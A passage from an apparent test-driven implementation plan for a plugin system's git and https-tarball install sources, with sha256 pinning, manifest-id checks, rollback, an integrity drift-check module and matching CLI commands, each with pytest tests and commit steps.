    ], cwd=repo_dir, check=True)
    sha = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=repo_dir, check=True, capture_output=True, text=True
    ).stdout.strip()
    return sha


def test_install_from_local_git_url(tmp_path: Path):
    if not _git_available():
        pytest.skip("git binary not available")
    src = tmp_path / "src-repo"
    head = _seed_local_repo(src, plugin_id="git-example")

    dest_root = tmp_path / "plugins"
    dest_root.mkdir()

    result = install_from_git(
        f"file://{src}",
        dest_root=dest_root,
        plugin_id_hint="git-example",
    )

    assert result.plugin_id == "git-example"
    assert (result.install_path / "plugin.json").exists()
    # Index recorded
    from opencomputer.plugins.installed_index import find_record
    rec = find_record(dest_root / ".installed_index.json", "git-example")
    assert rec is not None
    assert rec.source == "git"
    assert rec.source_ref == head


def test_install_from_git_with_explicit_ref(tmp_path: Path):
    if not _git_available():
        pytest.skip("git binary not available")
    src = tmp_path / "src-repo2"
    head = _seed_local_repo(src, plugin_id="ref-example")

    dest_root = tmp_path / "plugins"
    dest_root.mkdir()

    result = install_from_git(
        f"file://{src}",
        dest_root=dest_root,
        plugin_id_hint="ref-example",
        ref=head,
    )
    assert result.plugin_id == "ref-example"


def test_install_from_git_id_mismatch_rejected(tmp_path: Path):
    if not _git_available():
        pytest.skip("git binary not available")
    src = tmp_path / "src-repo3"
    _seed_local_repo(src, plugin_id="real-id")

    dest_root = tmp_path / "plugins"
    dest_root.mkdir()

    with pytest.raises(PluginIdMismatchError):
        install_from_git(
            f"file://{src}",
            dest_root=dest_root,
            plugin_id_hint="WRONG-id",
        )


def test_install_from_git_missing_binary_raises(tmp_path: Path):
    with patch("opencomputer.plugins.remote_install._git_path", return_value=None):
        with pytest.raises(GitNotFoundError):
            install_from_git(
                "git+https://github.com/x/y.git",
                dest_root=tmp_path,
                plugin_id_hint="x",
            )


def _git_available() -> bool:
    import shutil
    return shutil.which("git") is not None
```

- [ ] **Step 5.2: Run test to verify it fails**

```bash
pytest tests/test_remote_install_git.py -v
```

Expected: import errors (`install_from_git` / `GitNotFoundError` / `PluginIdMismatchError` don't exist).

- [ ] **Step 5.3: Implement `install_from_git`**

Add to `opencomputer/plugins/remote_install.py` (new errors near other error classes; new function near `install_from_catalog`):

```python
class GitNotFoundError(CatalogError):
    """git binary not found on PATH."""


class GitCloneError(CatalogError):
    """git clone failed (network, auth, or remote-not-found)."""


class PluginIdMismatchError(CatalogError):
    """Extracted plugin.json's `id` doesn't match what the user asked for."""


def _git_path() -> str | None:
    """shutil.which wrapped for test patching. Returns None if git not on PATH."""
    import shutil
    return shutil.which("git")


def _normalize_git_url(arg: str) -> str:
    """Strip the leading 'git+' prefix if present; otherwise return unchanged."""
    if arg.startswith("git+"):
        return arg[len("git+"):]
    return arg


def install_from_git(
    url: str,
    *,
    dest_root: Path,
    plugin_id_hint: str,
    ref: str | None = None,
    force: bool = False,
    before_install_hook: BeforeInstallHook | None = None,
    skip_scan: bool = False,
    git_path_fn=_git_path,
) -> InstallResult:
    """Install a plugin via shallow `git clone`.

    ``url`` accepts ``git+https://...``, ``git+ssh://...``, ``https://...``,
    ``ssh://...``, ``file://...``. The ``git+`` prefix is stripped before
    handing to git.

    ``ref`` pins a specific sha/tag/branch. If None, the default branch's
    HEAD is cloned and its resolved sha is recorded in the installed-index.
    """
    git = git_path_fn()
    if git is None:
        raise GitNotFoundError(
            "git binary not found on PATH — install Git or use catalog/url install instead."
        )

    plugin_dir = dest_root / plugin_id_hint
    if plugin_dir.exists():
        if not force:
            raise CatalogError(
                f"plugin '{plugin_id_hint}' already installed at {plugin_dir}. "
                "Use --force to overwrite."
            )
        import shutil

        shutil.rmtree(plugin_dir)

    git_url = _normalize_git_url(url)
    # Clone strategy:
    # * No ref → shallow clone of the default branch (depth=1 saves bandwidth).
    # * Explicit ref → full clone, then `git checkout <ref>`. We can't combine
    #   `--depth=1` with an arbitrary sha because shallow clones only know
    #   about the tip of the named branch/tag.
    if ref is None:
        clone_args = [git, "clone", "--depth=1", git_url, str(plugin_dir)]
    else:
        clone_args = [git, "clone", git_url, str(plugin_dir)]

    import subprocess

    try:
        subprocess.run(clone_args, check=True, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        raise GitCloneError(
            f"git clone failed: {e.stderr.strip() or e}"
        ) from e

    if ref is not None:
        try:
            subprocess.run(
                [git, "checkout", "--quiet", ref],
                cwd=plugin_dir,
                check=True,
                capture_output=True,
                text=True,
            )
        except subprocess.CalledProcessError as e:
            import shutil

            shutil.rmtree(plugin_dir, ignore_errors=True)
            raise GitCloneError(f"git checkout {ref} failed: {e.stderr.strip()}") from e

    head_sha = subprocess.run(
        [git, "rev-parse", "HEAD"],
        cwd=plugin_dir,
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()

    # Verify the cloned tree's plugin.json matches plugin_id_hint
    manifest_path = plugin_dir / "plugin.json"
    if not manifest_path.exists():
        import shutil

        shutil.rmtree(plugin_dir, ignore_errors=True)
        raise CatalogParseError(
            f"cloned repo at {git_url} has no plugin.json at the root"
        )
    try:
        manifest = json.loads(manifest_path.read_text())
    except json.JSONDecodeError as e:
        import shutil

        shutil.rmtree(plugin_dir, ignore_errors=True)
        raise CatalogParseError(f"plugin.json is not valid JSON: {e}") from e

    actual_id = str(manifest.get("id", ""))
    if actual_id != plugin_id_hint:
        import shutil

        shutil.rmtree(plugin_dir, ignore_errors=True)
        raise PluginIdMismatchError(
            f"plugin.json says id={actual_id!r} but install argument was {plugin_id_hint!r}"
        )

    version = str(manifest.get("version", ""))

    # Strip the .git directory to keep the installed tree clean and to avoid
    # accidental git-related leakage at runtime.
    git_dir = plugin_dir / ".git"
    if git_dir.exists():
        import shutil

        shutil.rmtree(git_dir)

    # Post-extract gate: scan + BEFORE_INSTALL hook (rolls back on failure)
    try:
        _post_extract_gate(
            plugin_dir=plugin_dir,
            install_source="git",
            install_url=url,
            install_plugin_id=plugin_id_hint,
            before_install_hook=before_install_hook,
            skip_scan=skip_scan,
        )
    except Exception:
        import shutil

        shutil.rmtree(plugin_dir, ignore_errors=True)
        raise

    # Record in installed-index
    from opencomputer.plugins.installed_index import (
        InstalledRecord,
        record_install,
    )
    import time

    record_install(
        dest_root / ".installed_index.json",
        InstalledRecord(
            plugin_id=plugin_id_hint,
            version=version,
            source="git",
            source_url=url,
            source_ref=head_sha,
            tarball_sha256=None,
            installed_at=int(time.time()),
        ),
    )

    return InstallResult(
        plugin_id=plugin_id_hint, version=version, install_path=plugin_dir
    )
```

Add `import json` near the top if not already present (it's used by `_atomic_write` so should already be there — verify).

Add the new exception classes + `install_from_git` to `__all__`.

- [ ] **Step 5.4: Run test to verify it passes**

```bash
pytest tests/test_remote_install_git.py -v
```

Expected: 4 passed (or 4 skipped if git not on PATH — but git is available on darwin by default, so should pass).

- [ ] **Step 5.5: Lint + commit**

```bash
ruff check opencomputer/plugins/remote_install.py tests/test_remote_install_git.py
git add opencomputer/plugins/remote_install.py tests/test_remote_install_git.py
git commit -m "feat(plugins): install_from_git — git+/ssh:// install source with shallow clone + ref pin"
```

---

## Task 6: Add `https://...tgz` install source

**Files:**
- Modify: `opencomputer/plugins/remote_install.py`
- Test: `tests/test_remote_install_url.py`

- [ ] **Step 6.1: Write the failing test**

Create `tests/test_remote_install_url.py`:

```python
from __future__ import annotations

import hashlib
from pathlib import Path

import pytest

from opencomputer.plugins.remote_install import (
    PluginIdMismatchError,
    TarballChecksumError,
    UnsupportedTarballFormat,
    install_from_url,
)
# Reuse the helper from the hooks test module
from tests._helpers.install_fixtures import make_tarball as _make_tarball


def test_install_from_url_happy_path(tmp_path: Path):
    raw = _make_tarball("url-example")
    sha = hashlib.sha256(raw).hexdigest()
    dest_root = tmp_path / "plugins"
    dest_root.mkdir()

    result = install_from_url(
        "https://example.test/url-example.tgz",
        dest_root=dest_root,
        plugin_id_hint="url-example",
        sha256=sha,
        http_get_bytes_fn=lambda url, max_bytes: raw,
    )
    assert result.plugin_id == "url-example"


def test_install_from_url_requires_sha256(tmp_path: Path):
    raw = _make_tarball("no-sha")
    dest_root = tmp_path / "plugins"
    dest_root.mkdir()

    with pytest.raises(TarballChecksumError, match="--sha256"):
        install_from_url(
            "https://example.test/x.tgz",
            dest_root=dest_root,
            plugin_id_hint="no-sha",
            sha256=None,
            http_get_bytes_fn=lambda url, max_bytes: raw,
        )


def test_install_from_url_sha256_mismatch_rejected(tmp_path: Path):
    raw = _make_tarball("bad-sha")
    dest_root = tmp_path / "plugins"
    dest_root.mkdir()

    with pytest.raises(TarballChecksumError, match="sha256 mismatch"):
        install_from_url(
            "https://example.test/x.tgz",
            dest_root=dest_root,
            plugin_id_hint="bad-sha",
            sha256="0" * 64,
            http_get_bytes_fn=lambda url, max_bytes: raw,
        )


def test_install_from_url_id_mismatch_rejected(tmp_path: Path):
    raw = _make_tarball("real-id")
    sha = hashlib.sha256(raw).hexdigest()
    dest_root = tmp_path / "plugins"
    dest_root.mkdir()

    with pytest.raises(PluginIdMismatchError):
        install_from_url(
            "https://example.test/x.tgz",
            dest_root=dest_root,
            plugin_id_hint="WRONG-id",
            sha256=sha,
            http_get_bytes_fn=lambda url, max_bytes: raw,
        )


def test_install_from_url_unsupported_format_rejected(tmp_path: Path):
    dest_root = tmp_path / "plugins"
    dest_root.mkdir()

    with pytest.raises(UnsupportedTarballFormat):
        install_from_url(
            "https://example.test/x.zip",  # extension hint
            dest_root=dest_root,
            plugin_id_hint="zip",
            sha256="0" * 64,
            http_get_bytes_fn=lambda url, max_bytes: b"PK\x03\x04",  # zip magic
        )
```

- [ ] **Step 6.2: Run test to verify it fails**

```bash
pytest tests/test_remote_install_url.py -v
```

Expected: import errors.

- [ ] **Step 6.3: Implement `install_from_url`**

Add to `opencomputer/plugins/remote_install.py`:

```python
class UnsupportedTarballFormat(CatalogError):
    """Tarball is not .tar.gz / .tgz."""


_TARBALL_GZIP_MAGIC = b"\x1f\x8b"


def install_from_url(
    url: str,
    *,
    dest_root: Path,
    plugin_id_hint: str,
    sha256: str | None,
    force: bool = False,
    before_install_hook: BeforeInstallHook | None = None,
    skip_scan: bool = False,
    http_get_bytes_fn=_http_get_bytes,
    max_bytes: int = MAX_TARBALL_BYTES,
) -> InstallResult:
    """Install a plugin from a raw https tarball URL.

    Requires an explicit ``sha256`` pin — refuses to install otherwise.
    Only ``.tar.gz`` / ``.tgz`` content is accepted (gzip magic bytes
    enforced; the URL extension is informational only).
    """
    if sha256 is None:
        raise TarballChecksumError(
            "https:// install requires --sha256 pin (refusing without checksum)"
        )

    plugin_dir = dest_root / plugin_id_hint
    if plugin_dir.exists():
        if not force:
            raise CatalogError(
                f"plugin '{plugin_id_hint}' already installed at {plugin_dir}. "
                "Use --force to overwrite."
            )
        import shutil

        shutil.rmtree(plugin_dir)

    raw = http_get_bytes_fn(url, max_bytes=max_bytes)

    actual_sha = hashlib.sha256(raw).hexdigest()
    if actual_sha != sha256.lower():
        raise TarballChecksumError(
            f"sha256 mismatch: expected {sha256}, got {actual_sha}"
        )

    if not raw.startswith(_TARBALL_GZIP_MAGIC):
        raise UnsupportedTarballFormat(
            f"only .tar.gz / .tgz tarballs are supported (url: {url})"
        )

    extract_tarball(raw, dest=plugin_dir)

    # Verify plugin.json id matches hint
    manifest_path = plugin_dir / "plugin.json"
    if not manifest_path.exists():
        import shutil

        shutil.rmtree(plugin_dir, ignore_errors=True)
        raise CatalogParseError(
            f"tarball at {url} has no plugin.json at the root"
        )
    try:
        manifest = json.loads(manifest_path.read_text())
    except json.JSONDecodeError as e:
        import shutil

        shutil.rmtree(plugin_dir, ignore_errors=True)
        raise CatalogParseError(f"plugin.json is not valid JSON: {e}") from e

    actual_id = str(manifest.get("id", ""))
    if actual_id != plugin_id_hint:
        import shutil

        shutil.rmtree(plugin_dir, ignore_errors=True)
        raise PluginIdMismatchError(
            f"plugin.json says id={actual_id!r} but install argument was {plugin_id_hint!r}"
        )
    version = str(manifest.get("version", ""))

    try:
        _post_extract_gate(
            plugin_dir=plugin_dir,
            install_source="url",
            install_url=url,
            install_plugin_id=plugin_id_hint,
            before_install_hook=before_install_hook,
            skip_scan=skip_scan,
        )
    except Exception:
        import shutil

        shutil.rmtree(plugin_dir, ignore_errors=True)
        raise

    from opencomputer.plugins.installed_index import (
        InstalledRecord,
        record_install,
    )
    import time

    record_install(
        dest_root / ".installed_index.json",
        InstalledRecord(
            plugin_id=plugin_id_hint,
            version=version,
            source="url",
            source_url=url,
            source_ref=None,
            tarball_sha256=actual_sha,
            installed_at=int(time.time()),
        ),
    )

    return InstallResult(
        plugin_id=plugin_id_hint, version=version, install_path=plugin_dir
    )
```

Add `UnsupportedTarballFormat` to `__all__` and add `install_from_url`.

- [ ] **Step 6.4: Run test to verify it passes**

```bash
pytest tests/test_remote_install_url.py -v
```

Expected: 5 passed.

- [ ] **Step 6.5: Lint + commit**

```bash
ruff check opencomputer/plugins/remote_install.py tests/test_remote_install_url.py
git add opencomputer/plugins/remote_install.py tests/test_remote_install_url.py
git commit -m "feat(plugins): install_from_url — raw https tarball install with required sha256 pin"
```

---

## Task 7: Implement `integrity.py` + `oc plugin verify`

**Files:**
- Create: `opencomputer/plugins/integrity.py`
- Test: `tests/test_integrity.py`

- [ ] **Step 7.1: Write the failing test**

Create `tests/test_integrity.py`:

```python
from __future__ import annotations

import hashlib
from pathlib import Path

import pytest

from opencomputer.plugins.installed_index import (
    InstalledRecord,
    record_install,
)
from opencomputer.plugins.integrity import (
    DriftReport,
    NotInstalled,
    SourceUnreachable,
    verify_plugin,
)
from tests._helpers.install_fixtures import make_tarball as _make_tarball


def test_verify_unknown_plugin_raises(tmp_path: Path):
    dest_root = tmp_path / "plugins"
    dest_root.mkdir()
    with pytest.raises(NotInstalled):
        verify_plugin("ghost", dest_root=dest_root)


def test_verify_catalog_install_clean(tmp_path: Path):
    """Round-trip: install (mock), verify, expect no drift."""
    dest_root = tmp_path / "plugins"
    dest_root.mkdir()

    raw = _make_tarball("clean-verify")
    sha = hashlib.sha256(raw).hexdigest()

    plugin_dir = dest_root / "clean-verify"
    plugin_dir.mkdir()
    (plugin_dir / "plugin.json").write_text(
        '{"id":"clean-verify","name":"clean-verify","version":"0.1.0","entry":"plugin.py"}'
    )
    (plugin_dir / "plugin.py").write_text("def register(api):\n    pass\n")

    record_install(
        dest_root / ".installed_index.json",
        InstalledRecord(
            plugin_id="clean-verify",
            version="0.1.0",
            source="catalog",
            source_url="clean-verify",
            source_ref=None,
            tarball_sha256=sha,
            installed_at=0,
        ),
    )

    # Re-fetch returns the same bytes — no drift
    report = verify_plugin(
        "clean-verify",
        dest_root=dest_root,
        refetch_fn=lambda rec: raw,
    )
    assert isinstance(report, DriftReport)
    assert report.has_drift is False


def test_verify_drift_detected_on_mutated_file(tmp_path: Path):
    dest_root = tmp_path / "plugins"
    dest_root.mkdir()

    raw_original = _make_tarball("drift-test")
    sha = hashlib.sha256(raw_original).hexdigest()

    plugin_dir = dest_root / "drift-test"
    plugin_dir.mkdir()
    (plugin_dir / "plugin.json").write_text(
        '{"id":"drift-test","name":"drift-test","version":"0.1.0","entry":"plugin.py"}'
    )
    # Write a DIFFERENT file to disk so the on-disk bytes differ from the tarball
    (plugin_dir / "plugin.py").write_text("def register(api):\n    print('mutated')\n")

    record_install(
        dest_root / ".installed_index.json",
        InstalledRecord(
            plugin_id="drift-test",
            version="0.1.0",
            source="catalog",
            source_url="drift-test",
            source_ref=None,
            tarball_sha256=sha,
            installed_at=0,
        ),
    )

    report = verify_plugin(
        "drift-test",
        dest_root=dest_root,
        refetch_fn=lambda rec: raw_original,
    )
    assert report.has_drift is True
    assert any("plugin.py" in d.path for d in report.differences)


def test_verify_source_unreachable_does_not_crash(tmp_path: Path):
    dest_root = tmp_path / "plugins"
    dest_root.mkdir()

    plugin_dir = dest_root / "offline"
    plugin_dir.mkdir()
    (plugin_dir / "plugin.json").write_text(
        '{"id":"offline","name":"offline","version":"0.1.0","entry":"plugin.py"}'
    )

    record_install(
        dest_root / ".installed_index.json",
        InstalledRecord(
            plugin_id="offline",
            version="0.1.0",
            source="url",
            source_url="https://gone.example/x.tgz",
            source_ref=None,
            tarball_sha256="0" * 64,
            installed_at=0,
        ),
    )

    def boom(rec):
        raise OSError("connection refused")

    with pytest.raises(SourceUnreachable):
        verify_plugin("offline", dest_root=dest_root, refetch_fn=boom)
```

- [ ] **Step 7.2: Run test to verify it fails**

```bash
pytest tests/test_integrity.py -v
```

Expected: import errors.

- [ ] **Step 7.3: Implement `integrity.py`**

Create `opencomputer/plugins/integrity.py`:

```python
"""Re-fetch + bytes-compare drift detection for installed plugins.

Used by ``oc plugin verify <plugin_id>`` to confirm that the installed
files still match the source they came from.

For ``catalog`` and ``url`` installs we re-download the tarball and
compare its sha256 to the recorded ``tarball_sha256``. If those match
but on-disk files don't match the tarball contents, we report it as
on-disk drift (someone hand-edited an installed plugin).

For ``git`` installs we re-clone the recorded ref and diff trees.
For ``path`` installs (future) drift detection is not meaningful.
"""

from __future__ import annotations

import hashlib
import io
import tarfile
from collections.abc import Callable
from dataclasses import dataclass, field
from pathlib import Path

from opencomputer.plugins.installed_index import (
    InstalledRecord,
    find_record,
)


class IntegrityError(Exception):
    """Base class for integrity check failures."""


class NotInstalled(IntegrityError):
    """No installed-index entry for the given plugin_id."""


class SourceUnreachable(IntegrityError):
    """Re-fetch raised — install source is no longer reachable."""


@dataclass(frozen=True)
class FileDifference:
    path: str
    kind: str  # "missing" | "extra" | "modified"


@dataclass(frozen=True)
class DriftReport:
    plugin_id: str
    source: str
    source_url: str
    has_drift: bool
    differences: list[FileDifference] = field(default_factory=list)


def _refetch_default(rec: InstalledRecord) -> bytes:
    """Default re-fetcher for the `url` source only.

    Catalog re-fetch is more complex (slug → catalog → tarball_url) so the
    CLI passes its own ``refetch_fn`` when the source is ``catalog``.
    Git re-fetch is handled inside ``_verify_via_git`` — never reaches here.
    """
    if rec.source == "url":
        from opencomputer.plugins.remote_install import _http_get_bytes
        return _http_get_bytes(rec.source_url, max_bytes=50 * 1024 * 1024)

    raise SourceUnreachable(
        f"default refetch_fn doesn't handle source={rec.source!r}; "
        "the CLI should pass a source-specific refetch_fn for catalog installs."
    )


def verify_plugin(
    plugin_id: str,
    *,
    dest_root: Path,
    refetch_fn: Callable[[InstalledRecord], bytes] = _refetch_default,
) -> DriftReport:
    """Re-fetch the source bytes and compare against on-disk plugin tree.

    Returns a DriftReport even when has_drift=False so the CLI can print
    a uniform summary.
    """
    rec = find_record(dest_root / ".installed_index.json", plugin_id)
    if rec is None:
        raise NotInstalled(f"no installed-index entry for {plugin_id!r}")

    plugin_dir = dest_root / plugin_id
    if not plugin_dir.exists():
        # Index says installed but dir is missing — treat as drift.
        return DriftReport(
            plugin_id=plugin_id,
            source=rec.source,
            source_url=rec.source_url,
            has_drift=True,
            differences=[FileDifference(path="<plugin-dir>", kind="missing")],
        )

    if rec.source in ("catalog", "url"):
        return _verify_via_tarball(rec=rec, plugin_dir=plugin_dir, refetch_fn=refetch_fn)
    if rec.source == "git":
        return _verify_via_git(rec=rec, plugin_dir=plugin_dir)
    # Unknown source — best-effort: no drift to report
    return DriftReport(
        plugin_id=plugin_id,
        source=rec.source,
        source_url=rec.source_url,
        has_drift=False,
    )


def _verify_via_tarball(
    *,
    rec: InstalledRecord,
    plugin_dir: Path,
    refetch_fn: Callable[[InstalledRecord], bytes],
) -> DriftReport:
    try:
        raw = refetch_fn(rec)
    except SourceUnreachable:
        raise
    except Exception as e:
        raise SourceUnreachable(
            f"could not re-fetch {rec.source_url!r}: {e}"
        ) from e

    if rec.tarball_sha256 is not None:
        actual = hashlib.sha256(raw).hexdigest()
        if actual != rec.tarball_sha256:
            return DriftReport(
                plugin_id=rec.plugin_id,
                source=rec.source,
                source_url=rec.source_url,
                has_drift=True,
                differences=[
                    FileDifference(
                        path=f"<source-tarball sha256 differs: recorded={rec.tarball_sha256[:12]}.. fetched={actual[:12]}..>",
                        kind="modified",
                    )
                ],
            )

    differences: list[FileDifference] = []
    on_disk: dict[str, bytes] = {}
    for f in plugin_dir.rglob("*"):
        if f.is_file():
            on_disk[str(f.relative_to(plugin_dir))] = f.read_bytes()

    in_tarball: dict[str, bytes] = {}
    with tarfile.open(fileobj=io.BytesIO(raw), mode="r:gz") as tar:
        for member in tar.getmembers():
            if not member.isfile():
                continue
            f = tar.extractfile(member)
            if f is None:
                continue
            in_tarball[member.name] = f.read()

    for path, body in in_tarball.items():
        if path not in on_disk:
            differences.append(FileDifference(path=path, kind="missing"))
        elif on_disk[path] != body:
            differences.append(FileDifference(path=path, kind="modified"))

    for path in on_disk:
        if path not in in_tarball:
            differences.append(FileDifference(path=path, kind="extra"))

    return DriftReport(
        plugin_id=rec.plugin_id,
        source=rec.source,
        source_url=rec.source_url,
        has_drift=bool(differences),
        differences=differences,
    )


def _verify_via_git(*, rec: InstalledRecord, plugin_dir: Path) -> DriftReport:
    """Reclone + diff. Skipped if git binary is missing — emit a partial report."""
    import shutil
    import subprocess
    import tempfile

    git = shutil.which("git")
    if git is None:
        return DriftReport(
            plugin_id=rec.plugin_id,
            source=rec.source,
            source_url=rec.source_url,
            has_drift=False,
            differences=[
                FileDifference(path="<git binary not found — skipping verify>", kind="modified")
            ],
        )

    with tempfile.TemporaryDirectory(prefix="oc-verify-") as td:
        clone_dir = Path(td) / "clone"
        try:
            subprocess.run(
                [git, "clone", "--quiet", rec.source_url.removeprefix("git+"), str(clone_dir)],
                check=True,
                capture_output=True,
                text=True,
            )
            if rec.source_ref:
                subprocess.run(
                    [git, "checkout", "--quiet", rec.source_ref],
                    cwd=clone_dir,
                    check=True,
                    capture_output=True,
                    text=True,
                )
        except subprocess.CalledProcessError as e:
            raise SourceUnreachable(
                f"git re-clone of {rec.source_url} failed: {e.stderr.strip()}"
            ) from e

        # Strip .git from clone before comparing
        clone_git = clone_dir / ".git"
        if clone_git.exists():
            shutil.rmtree(clone_git)

        clone_files: dict[str, bytes] = {}
        for f in clone_dir.rglob("*"):
            if f.is_file():
                clone_files[str(f.relative_to(clone_dir))] = f.read_bytes()
        on_disk: dict[str, bytes] = {}
        for f in plugin_dir.rglob("*"):
            if f.is_file():
                on_disk[str(f.relative_to(plugin_dir))] = f.read_bytes()

        differences: list[FileDifference] = []
        for path, body in clone_files.items():
            if path not in on_disk:
                differences.append(FileDifference(path=path, kind="missing"))
            elif on_disk[path] != body:
                differences.append(FileDifference(path=path, kind="modified"))
        for path in on_disk:
            if path not in clone_files:
                differences.append(FileDifference(path=path, kind="extra"))

        return DriftReport(
            plugin_id=rec.plugin_id,
            source=rec.source,
            source_url=rec.source_url,
            has_drift=bool(differences),
            differences=differences,
        )


__all__ = [
    "DriftReport",
    "FileDifference",
    "IntegrityError",
    "NotInstalled",
    "SourceUnreachable",
    "verify_plugin",
]
```

- [ ] **Step 7.4: Run test to verify it passes**

```bash
pytest tests/test_integrity.py -v
```

Expected: 4 passed.

- [ ] **Step 7.5: Lint + commit**

```bash
ruff check opencomputer/plugins/integrity.py tests/test_integrity.py
git add opencomputer/plugins/integrity.py tests/test_integrity.py
git commit -m "feat(plugins): integrity drift check + oc plugin verify foundation"
```

---

## Task 8: Wire CLI surface — `oc plugin install <git+|https://>` + `oc plugin verify`

**Files:**
- Modify: `opencomputer/cli_plugin.py`
- Test: `tests/test_cli_plugin_install_sources.py` (NEW)

- [ ] **Step 8.1: Write the failing test**

Create `tests/test_cli_plugin_install_sources.py`:

```python
from __future__ import annotations

import hashlib
import json
from pathlib import Path
from unittest.mock import patch

from typer.testing import CliRunner

from opencomputer.cli_plugin import plugin_app
from tests._helpers.install_fixtures import make_tarball as _make_tarball


def test_install_arg_starting_with_git_routes_to_git(tmp_path: Path, monkeypatch):
    """When the user types `oc plugin install git+https://...`, we route to install_from_git."""

    monkeypatch.setenv("OPENCOMPUTER_HOME", str(tmp_path / "home"))
    captured = {}

    def fake_git_install(url, *, dest_root, plugin_id_hint, **kwargs):
        captured["url"] = url
        captured["plugin_id_hint"] = plugin_id_hint
        from opencomputer.plugins.remote_install import InstallResult
        plugin_dir = dest_root / plugin_id_hint
        plugin_dir.mkdir(parents=True, exist_ok=True)
        return InstallResult(plugin_id_hint, "0.1.0", plugin_dir)

    runner = CliRunner()
    with patch("opencomputer.cli_plugin._install_from_git", side_effect=fake_git_install):
        result = runner.invoke(
            plugin_app,
            ["install", "git+https://github.com/example/foo.git", "--id", "foo"],
        )

    assert result.exit_code == 0, result.output
    assert captured["plugin_id_hint"] == "foo"
    assert captured["url"] == "git+https://github.com/example/foo.git"


def test_install_arg_starting_with_https_routes_to_url(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("OPENCOMPUTER_HOME", str(tmp_path / "home"))
    raw = _make_tarball("urlcli")
    sha = hashlib.sha256(raw).hexdigest()

    def fake_url_install(url, *, dest_root, plugin_id_hint, sha256, **kwargs):
        from opencomputer.plugins.remote_install import InstallResult
        plugin_dir = dest_root / plugin_id_hint
        plugin_dir.mkdir(parents=True, exist_ok=True)
        return InstallResult(plugin_id_hint, "0.1.0", plugin_dir)

    runner = CliRunner()
    with patch("opencomputer.cli_plugin._install_from_url", side_effect=fake_url_install):
        result = runner.invoke(
            plugin_app,
            ["install", "https://example.com/x.tgz", "--id", "urlcli", "--sha256", sha],
        )
    assert result.exit_code == 0, result.output


def test_verify_subcommand_prints_clean_report(tmp_path: Path, monkeypatch):
    monkeypatch.setenv("OPENCOMPUTER_HOME", str(tmp_path / "home"))
    home = Path(tmp_path / "home")
    plugins_dir = home / "default" / "plugins"
    plugins_dir.mkdir(parents=True)

    from opencomputer.plugins.installed_index import (
        InstalledRecord,
        record_install,
    )

    record_install(
        plugins_dir / ".installed_index.json",
        InstalledRecord(
            plugin_id="ok",
            version="0.1.0",
            source="catalog",
            source_url="ok",
            source_ref=None,
            tarball_sha256="abc",
            installed_at=0,
        ),
    )

    plugin_dir = plugins_dir / "ok"
    plugin_dir.mkdir()
    (plugin_dir / "plugin.json").write_text('{"id":"ok","name":"ok","version":"0.1.0","entry":"p.py"}')

    fake_report_drift_false = lambda *a, **kw: None  # placeholder

    runner = CliRunner()

    from opencomputer.plugins.integrity import DriftReport

    def fake_verify(plugin_id, *, dest_root, **kwargs):
        return DriftReport(
            plugin_id=plugin_id,
            source="catalog",
            source_url="ok",
            has_drift=False,
        )

    with patch("opencomputer.cli_plugin._verify_plugin", side_effect=fake_verify):
        result = runner.invoke(plugin_app, ["verify", "ok"])

    assert result.exit_code == 0, result.output
    assert "no drift" in result.output.lower()
```

- [ ] **Step 8.2: Run test to verify it fails**

```bash
pytest tests/test_cli_plugin_install_sources.py -v
```

Expected: failures — CLI doesn't accept `--id` / `--sha256` / `verify` yet.

- [ ] **Step 8.3: Extend `cli_plugin.py`**

Modify the existing `install` command in `opencomputer/cli_plugin.py`:

1. Add new typer Options for `--id`, `--sha256`, `--ref`. Keep existing `--remote` / `--profile` / `--global`.

2. At the top of `install()`, route to git/url helpers:

```python
def _install_from_git(url, **kwargs):
    """Indirection to make patching trivial in tests."""
    from opencomputer.plugins.remote_install import install_from_git
    return install_from_git(url, **kwargs)


def _install_from_url(url, **kwargs):
    from opencomputer.plugins.remote_install import install_from_url
    return install_from_url(url, **kwargs)


def _verify_plugin(*args, **kwargs):
    from opencomputer.plugins.integrity import verify_plugin
    return verify_plugin(*args, **kwargs)
```

3. In the `install` function body, before the existing path-vs-remote routing logic:

```python
    # Phase 1 — git/url install paths (URL-scheme routing, no flag needed).
    if plugin_arg.startswith(("git+http", "git+ssh", "git+file", "git+https")):
        if id is None:
            _console.print(
                "[red]error:[/red] git installs require --id <plugin-id> "
                "(must match the cloned repo's plugin.json)"
            )
            raise typer.Exit(code=2)
        dest_root = _install_dest(profile=profile, global_=global_)
        result = _install_from_git(
            plugin_arg, dest_root=dest_root, plugin_id_hint=id, ref=ref, force=force
        )
        _console.print(
            f"[green]installed:[/green] '{result.plugin_id}' v{result.version} (git) → {result.install_path}"
        )
        return

    if plugin_arg.startswith(("http://", "https://")):
        if id is None or sha256 is None:
            _console.print(
                "[red]error:[/red] https:// installs require both --id <plugin-id> and --sha256 <hex>"
            )
            raise typer.Exit(code=2)
        dest_root = _install_dest(profile=profile, global_=global_)
        result = _install_from_url(
            plugin_arg,
            dest_root=dest_root,
            plugin_id_hint=id,
            sha256=sha256,
            force=force,
        )
        _console.print(
            f"[green]installed:[/green] '{result.plugin_id}' v{result.version} (url) → {result.install_path}"
        )
        return
```

(Where `plugin_arg` is whatever the existing function names its first positional argument — read the file before pasting.)

4. Add the `verify` command at the end of the file:

```python
@plugin_app.command("verify")
def verify(
    plugin_id: str = typer.Argument(..., help="Plugin id to verify."),
    profile: str | None = typer.Option(None, "--profile"),
    global_: bool = typer.Option(False, "--global"),
) -> None:
    """Compare an installed plugin's bytes against its source."""
    from opencomputer.plugins.installed_index import find_record

    dest_root = _install_dest(profile=profile, global_=global_)
    rec = find_record(dest_root / ".installed_index.json", plugin_id)
    if rec is None:
        _console.print(f"[red]error:[/red] '{plugin_id}' is not installed")
        raise typer.Exit(code=2)

    # Catalog source needs a CLI-driven refetch_fn that goes through the
    # catalog → tarball URL. Other sources use the integrity module's default.
    refetch_fn = None
    if rec.source == "catalog":
        from opencomputer.plugins.remote_install import (
            download_and_verify,
            fetch_catalog,
            find_entry,
        )

        def refetch_fn(record):  # noqa: ARG001
            catalog = fetch_catalog()
            entry = find_entry(catalog, record.plugin_id)
            return download_and_verify(entry)

    try:
        if refetch_fn is not None:
            report = _verify_plugin(plugin_id, dest_root=dest_root, refetch_fn=refetch_fn)
        else:
            report = _verify_plugin(plugin_id, dest_root=dest_root)
    except Exception as e:  # NotInstalled / SourceUnreachable / ...
